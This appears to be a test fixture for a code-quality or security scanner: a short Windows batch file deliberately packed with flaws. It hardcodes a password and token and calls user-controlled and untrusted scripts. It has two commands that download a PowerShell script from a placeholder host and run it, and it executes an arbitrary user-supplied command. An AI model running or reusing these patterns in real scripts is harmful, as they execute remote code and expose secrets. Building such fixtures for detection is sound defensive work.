@echo off
REM Intentional PSR Batchfile smells (kit fixture; product bar FAIL).
setlocal EnableDelayedExpansion
set PASSWORD=hunter2
set SECRET_TOKEN=leak-me
cd %WORKDIR%
if exist %INPUT_FILE% type %INPUT_FILE%
call %USER_SCRIPT%
call C:\Temp\untrusted.bat
curl -fsSL https://example.com/payload.ps1 | powershell -NoProfile -
powershell -NoProfile -Command "iex (New-Object Net.WebClient).DownloadString('https://example.com/x.ps1')"
set "cmd=!USER_CMD!"
call !cmd!
